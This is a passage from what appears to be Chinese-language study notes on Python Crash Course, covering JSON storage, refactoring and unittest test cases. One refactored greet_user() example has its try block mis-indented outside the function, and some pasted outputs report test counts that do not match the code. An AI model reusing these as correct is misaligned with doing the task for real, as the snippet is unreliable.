，再创建一个数字列表。我们指定了要将该数字列表存储到其中的文件的名称。通常使用文件扩展名.json来指出文件存储的数据为JSON格式。接下来，我们以写入模式打开这个文件，让json 能够将数据写入其中。我们使用函数json.dump() 将数字列表存储到文件numbers.json中。<br>这个程序没有输出，但我们可以打开文件numbers.json，看看其内容。数据的存储格式与Python中一样：<br><code>[2, 3, 5, 7, 11, 13]</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">'numbers.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">    numbers = json.load(f_obj)</span><br><span class="line">print(numbers)</span><br></pre></td></tr></table></figure></p><p><code>[2, 3, 5, 7, 11, 13]</code></p><p><strong>保存和读取用户生成的数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 如果以前存储了用户名，就加载它</span></span><br><span class="line"><span class="comment"># 否则，就提示用户输入用户名并存储它</span></span><br><span class="line">filename = <span class="string">'username.json'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        username = json.load(f_obj)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    username = input(<span class="string">"What is your name? "</span>)</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">        json.dump(username, f_obj)</span><br><span class="line">        print(<span class="string">"We'll remember you when you come back, "</span> + username + <span class="string">"!"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Welcome back, "</span> + username + <span class="string">"!"</span>)</span><br></pre></td></tr></table></figure><p><code>What is your name? Alex</code><br><code>We&#39;ll remember you when you come back, Alex!</code><br><code>Welcome back, Alex!</code></p><p><strong>重构</strong></p><p>你经常会遇到这样的情况：代码能够正确地运行，但可做进一步的改进——将代码划分为一系列完成具体工作的函数。这样的过程被称为<strong>重构</strong> 。重构让代码更清晰、更易于理解、更容易扩展。<br>要重构remember_me.py，可将其大部分逻辑放到一个或多个函数中。remember_me.py的重点是问候用户，因此我们将其所有代码都放到一个名为greet_user() 的函数中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_user</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""问候用户，并指出其名字"""</span></span><br><span class="line">    filename = <span class="string">'username.json'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        username = json.load(f_obj)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    username = input(<span class="string">"What is your name? "</span>)</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">        json.dump(username, f_obj)</span><br><span class="line">        print(<span class="string">"We'll remember you when you come back, "</span> + username + <span class="string">"!"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Welcome back, "</span> + username + <span class="string">"!"</span>)</span><br><span class="line"></span><br><span class="line">greet_user()</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stored_username</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""如果存储了用户名，就获取它"""</span></span><br><span class="line">    filename = <span class="string">'username.json'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">            username = json.load(f_obj)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> username</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_new_username</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""提示用户输入用户名"""</span></span><br><span class="line">    username = input(<span class="string">"What is your name? "</span>)</span><br><span class="line">    filename = <span class="string">'username.json'</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">        json.dump(username, f_obj)</span><br><span class="line">        <span class="keyword">return</span> username</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_user</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""问候用户，并指出其名字"""</span></span><br><span class="line">    username = get_stored_username()</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        print(<span class="string">"Welcome back, "</span> + username + <span class="string">"!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = get_new_username()</span><br><span class="line">        print(<span class="string">"We'll remember you when you come back, "</span> + username + <span class="string">"!"</span>)</span><br><span class="line"></span><br><span class="line">greet_user()</span><br></pre></td></tr></table></figure><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>编写函数或类时，还可为其编写测试。通过测试，可确定代码面对各种输入都能够按要求的那样工作。测试让你信心满满，深信即便有更多的人使用你的程序，它也能正确地工作。在程序中添加新代码时，你也可以对其进行测试，确认它们不会破坏程序既有的行为。程序员都会犯错，因此每个程序员都必须经常测试其代码，在用户发现问题前找出它们。<br>在本章中，你将学习如何使用Python模块unittest 中的工具来测试代码。你将学习编写测试用例，核实一系列输入都将得到预期的输出。你将看到测试通过了是什么样子，测试未通过又是什么样子，还将知道测试未通过如何有助于改进代码。你将学习如何测试函数和类，并将知道该为项目编写多少个测试。</p><p><strong>测试函数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> name_function <span class="keyword">import</span> get_formatted_name</span><br><span class="line">print(<span class="string">"Enter 'q' at any time to quit."</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    first = input(<span class="string">"\nPlease give me a first name: "</span>)</span><br><span class="line">    <span class="keyword">if</span> first == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    last = input(<span class="string">"Please give me a last name: "</span>)</span><br><span class="line">    <span class="keyword">if</span> last == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    formatted_name = get_formatted_name(first, last)</span><br><span class="line">    print(<span class="string">"\tNeatly formatted name: "</span> + formatted_name + <span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p><code>Enter &#39;q&#39; at any time to quit.</code></p><p><code>Please give me a first name: 34</code><br><code>Please give me a last name: 12</code><br><code>Neatly formatted name: 34 12.</code></p><p><code>Please give me a first name: 21</code><br><code>Please give me a last name: 32</code><br><code>Neatly formatted name: 21 32.</code></p><p><strong>单元测试和测试用例</strong></p><p>Python标准库中的模块unittest 提供了代码测试工具。<strong>单元测试</strong>用于核实函数的某个方面没有问题；<strong>测试用例</strong>是一组单元测试，这些单元测试一起核实函数在各种情形下的行为都符合要求。良好的测试用例考虑到了函数可能收到的各种输入，包含针对所有这些情形的测试。<strong>全覆盖式测试</strong>用例包含一整套单元测试，涵盖了各种可能的函数使用方式。对于大型项目，要实现全覆盖可能很难。通常，最初只要针对代码的重要行为编写测试即可，等项目被广泛使用时再考虑全覆盖。</p><p><strong>可通过的测试</strong></p><p>创建测试用例的语法需要一段时间才能习惯，但测试用例创建后，再添加针对函数的单元测试就很简单了。要为函数编写测试用例，可先导入模块unittest 以及要测试的函数，再创建一个继承unittest.TestCase 的类，并编写一系列方法对函数行为的不同方面进行测试。<br>下面是一个只包含一个方法的测试用例，它检查函数get_formatted_name() 在给定名和姓时能否正确地工作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> name_function <span class="keyword">import</span> get_formatted_name</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NamesTestCase</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="string">"""测试name_function.py"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_first_last_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""能够正确地处理像Janis Joplin这样的姓名吗？"""</span></span><br><span class="line">        formatted_name = get_formatted_name(<span class="string">'janis'</span>, <span class="string">'joplin'</span>)</span><br><span class="line">        self.assertEqual(formatted_name, <span class="string">'Janis Joplin'</span>)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure></p><p>首先，我们导入了模块unittest 和要测试的函数get_formatted_name() 。在❶处，我们创建了一个名为NamesTestCase 的类，用于包含一系列针对get_formatted_name() 的单元测试。你可随便给这个类命名，但最好让它看起来与要测试的函数相关，并包含字样Test。这个类必须继承unittest.TestCase 类，这样Python才知道如何运行你编写的测试。<br>NamesTestCase 只包含一个方法，用于测试get_formatted_name() 的一个方面。我们将这个方法命名为test_first_last_name() ，因为我们要核实的是只有名和姓的姓名能否被正确地格式化。我们运行testname_function.py时，所有以test 打头的方法都将自动运行。在这个方法中，我们调用了要测试的函数，并存储了要测试的返回值。<br>在这个示例中，我们使用实参’janis’ 和’joplin’ 调用get_formatted_name() ，并将结果存储到变量formatted_name 中（见❷）。<br>在❸处，我们使用了unittest 类最有用的功能之一：一个断言 方法。断言方法用来核实得到的结果是否与期望的结果一致。在这里，我们知道get_formatted_name() 应返回这样的姓名，即名和姓的首字母为大写，且它们之间有一个空格，因此我们期望formatted_name 的值为Janis Joplin 。为检查是否确实如此，我们调用unittest的方法assertEqual() ，并向它传递formatted_name 和’Janis Joplin’ 。代码行self.assertEqual(formatted_name, ‘Janis Joplin’) 的意思是说：“将formatted_name 的值同字符串’Janis Joplin’ 进行比较，如果它们相等，就万事大吉，如果它们不相等，跟我说一声！”<br>代码行unittest.main() 让Python运行这个文件中的测试。运行test_name_function.py时，得到的输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 1 test in 0.081s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><strong>不能通过的测试</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span><span class="params">(first, middle, last)</span>:</span></span><br><span class="line">    <span class="string">"""生成整洁的姓名"""</span></span><br><span class="line">    full_name = first + <span class="string">' '</span> + middle + <span class="string">' '</span> + last</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br></pre></td></tr></table></figure><p>，但对其进行测试时，我们发现它再也不能正确地处理只有名和姓的姓名。这次运行程序test_name_function.py时，输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">EReloaded modules: name_function</span><br><span class="line"></span><br><span class="line">======================================================================</span><br><span class="line">ERROR: test_first_last_name (__main__.NamesTestCase)</span><br><span class="line">能够正确地处理像Janis Joplin这样的姓名吗？</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:/Coding/Jupyter/Python Crash Course/test_name_function _2.py&quot;, line 7, in test_first_last_name</span><br><span class="line">    formatted_name = get_formatted_name(&apos;janis&apos;, &apos;joplin&apos;)</span><br><span class="line">TypeError: get_formatted_name() missing 1 required positional argument: &apos;last&apos;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 1 test in 0.000s</span><br><span class="line"></span><br><span class="line">FAILED (errors=1)</span><br></pre></td></tr></table></figure></p><p>第1行输出只有一个字母E （见❶），它指出测试用例中有一个单元测试导致了错误。接下来，我们<br>看到NamesTestCase 中的test_first_last_name() 导致了错误（见❷）。测试用例包含众多单元测试时，知道哪个测试未通过至关重要。在❸处，我们看到了一个标准的traceback，它指出函数调用get_formatted_name(‘janis’, ‘joplin’) 有问题，因为它缺少一个必不可少的位置实参。<br>我们还看到运行了一个单元测试（见❹）。最后，还看到了一条消息，它指出整个测试用例都未通过，因为运行该测试用例时发生了一个错误（见❺）。这条消息位于输出末尾，让你一眼就能看到——你可不希望为获悉有多少测试未通过而翻阅长长的输出。</p><p><strong>测试未通过时怎么办</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span><span class="params">(first, last, middle=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="string">"""生成整洁的姓名"""</span></span><br><span class="line">    <span class="keyword">if</span> middle:</span><br><span class="line">        full_name = first + <span class="string">' '</span> + middle + <span class="string">' '</span> + last</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        full_name = first + <span class="string">' '</span> + last</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br></pre></td></tr></table></figure></p><p>在get_formatted_name() 的这个新版本中，中间名是可选的。如果向这个函数传递了中间名（if middle: ），姓名将包含名、中间名和姓，否则姓名将只包含名和姓。<br>现在，对于两种不同的姓名，这个函数都应该能够正确地处理。为确定这个函数依然能够正确地处理像Janis Joplin这样的姓名，我们再次运行test_name_function.py：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 1 test in 0.000s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><strong>添加新测试</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> name_function_3 <span class="keyword">import</span> get_formatted_name</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NamesTestCase</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="string">"""测试name_function.py """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_first_last_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""能够正确地处理像Janis Joplin这样的姓名吗？"""</span></span><br><span class="line">        formatted_name = get_formatted_name(<span class="string">'janis'</span>, <span class="string">'joplin'</span>)</span><br><span class="line">        self.assertEqual(formatted_name, <span class="string">'Janis Joplin'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_first_last_middle_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""能够正确地处理像Wolfgang Amadeus Mozart这样的姓名吗？"""</span></span><br><span class="line">        formatted_name = get_formatted_name(<span class="string">'wolfgang'</span>, <span class="string">'mozart'</span>, <span class="string">'amadeus'</span>)</span><br><span class="line">        self.assertEqual(formatted_name, <span class="string">'Wolfgang Amadeus Mozart'</span>)</span><br><span class="line"></span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 2 tests in 0.000s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><strong>测试类</strong></p><p><strong>各种断言方法</strong></p><p>Python在unittest.TestCase 类中提供了很多断言方法。前面说过，断言方法检查你认为应该满足的条件是否确实满足。如果该条件确实满足，你对程序行为的假设就得到了确认，你就可以确信其中没有错误。如果你认为应该满足的条件实际上并不满足，Python将引发异常。<br>表11-1描述了6个常用的断言方法。使用这些方法可核实返回的值等于或不等于预期的值、返回的值为True 或False 、返回的值在列表中或不在列表中。你只能在继承unittest.TestCase 的类中使用这些方法，下面来看看如何在测试类时使用其中的一个。</p><p><em>unittest Module中的断言方法</em><br>|方法|用途|<br>|:—|:—|<br>|assertEqual(a, b) |核实a == b|<br>|assertNotEqual(a, b) |核实a != b|<br>|assertTrue(x) |核实x 为True|<br>|assertFalse(x) |核实x 为False|<br>|assertIn(item , list )| 核实 item 在 list 中|<br>|assertNotIn(item , list ) |核实 item 不在 list 中|</p><p><strong>一个要测试的类</strong></p><p>类的测试与函数的测试相似——你所做的大部分工作都是测试类中方法的行为，但存在一些不同之处，下面来编写一个类进行测试。来看一个帮助管理匿名调查的类：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnonymousSurvey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""收集匿名调查问卷的答案"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, question)</span>:</span></span><br><span class="line">        <span class="string">"""存储一个问题，并为存储答案做准备"""</span></span><br><span class="line">        self.question = question</span><br><span class="line">        self.responses = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_question</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""显示调查问卷"""</span></span><br><span class="line">        print(self.question)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">store_response</span><span class="params">(self, new_response)</span>:</span></span><br><span class="line">        <span class="string">"""存储单份调查答卷"""</span></span><br><span class="line">        self.responses.append(new_response)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_results</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""显示收集到的所有答卷"""</span></span><br><span class="line">        print(<span class="string">"Survey results:"</span>)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            print(<span class="string">'- '</span> + response)</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="comment">#定义一个问题，并创建一个表示调查的AnonymousSurvey对象</span></span><br><span class="line">question = <span class="string">"What language did you first learn to speak?"</span></span><br><span class="line">my_survey = AnonymousSurvey(question)</span><br><span class="line"><span class="comment">#显示问题并存储答案</span></span><br><span class="line">my_survey.show_question()</span><br><span class="line">print(<span class="string">"Enter 'q' at any time to quit.\n"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    response = input(<span class="string">"Language: "</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'q'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    my_survey.store_response(response)</span><br><span class="line"><span class="comment"># 显示调查结果</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"\nThank you to everyone who participated in the survey!"</span>)</span><br><span class="line">my_survey.show_results()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">What language did you first learn to speak?</span><br><span class="line">Enter &apos;q&apos; at any time to quit.</span><br><span class="line"></span><br><span class="line">Language: English</span><br><span class="line">Language: English</span><br><span class="line">Language: Spanish</span><br><span class="line">Language: Mandarin</span><br><span class="line">Language: q</span><br><span class="line"></span><br><span class="line">Thank you to everyone who participated in the survey!</span><br><span class="line">Survey results:</span><br><span class="line">- English</span><br><span class="line">- English</span><br><span class="line">- Spanish</span><br><span class="line">- Mandarin</span><br></pre></td></tr></table></figure><p><strong>测试AnonymousSurvey 类</strong><br>对AnonymousSurvey 类的行为的一个方面进行验证：如果用户面对调查问题时只提供了一个答案，这个答案也能被妥善地存储。为此，我们将在这个答案被存储后，使用方法assertIn() 来核实它包含在答案列表中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAnonmyousSurvey</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="string">"""针对AnonymousSurvey类的测试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_store_single_response</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""测试单个答案会被妥善地存储"""</span></span><br><span class="line">        question = <span class="string">"What language did you first learn to speak?"</span></span><br><span class="line">        my_survey = AnonymousSurvey(question)</span><br><span class="line">        my_survey.store_response(<span class="string">'English'</span>)</span><br><span class="line">        self.assertIn(<span class="string">'English'</span>, my_survey.responses)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_store_three_responses</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""测试三个答案会被妥善地存储"""</span></span><br><span class="line">        question = <span class="string">"What language did you first learn to speak?"</span></span><br><span class="line">        my_survey = AnonymousSurvey(question)</span><br><span class="line">        responses = [<span class="string">'English'</span>, <span class="string">'Spanish'</span>, <span class="string">'Mandarin'</span>]</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> responses:</span><br><span class="line">            self.assertIn(response, my_survey.responses)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 4 tests in 0.009s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><strong>方法setUp()</strong><br>在前面的test<em>survey.py中，我们在每个测试方法中都创建了一个AnonymousSurvey 实例，并在每个方法中都创建了答案。unittest.TestCase 类包含方法setUp() ，让我们只需创建这些对象一次，并在每个测试方法中使用它们。如果你在TestCase 类中包含了方法setUp() ，Python将先运行它，再运行各个以test\</em>打头的方法。这样，在你编写的每个测试方法中都可使用在方法setUp() 中创建的对象了。<br>下面使用setUp() 来创建一个调查对象和一组答案，供方法test_store_single_response() 和test_store_three_responses() 使用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> survey <span class="keyword">import</span> AnonymousSurvey</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAnonymousSurvey</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="string">"""针对AnonymousSurvey类的测试"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        创建一个调查对象和一组答案，供使用的测试方法使用</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        question = <span class="string">"What language did you first learn to speak?"</span></span><br><span class="line">        self.my_survey = AnonymousSurvey(question)</span><br><span class="line">        self.responses = [<span class="string">'English'</span>, <span class="string">'Spanish'</span>, <span class="string">'Mandarin'</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_store_single_response</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""测试单个答案会被妥善地存储"""</span></span><br><span class="line">        self.my_survey.store_response(self.responses[<span class="number">0</span>])</span><br><span class="line">        self.assertIn(self.responses[<span class="number">0</span>], self.my_survey.responses)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_store_three_responses</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""测试三个答案会被妥善地存储"""</span></span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.my_survey.store_response(response)</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> self.responses:</span><br><span class="line">            self.assertIn(response, self.my_survey.responses)</span><br><span class="line">unittest.main()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 6 tests in 0.010s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>方法setUp() 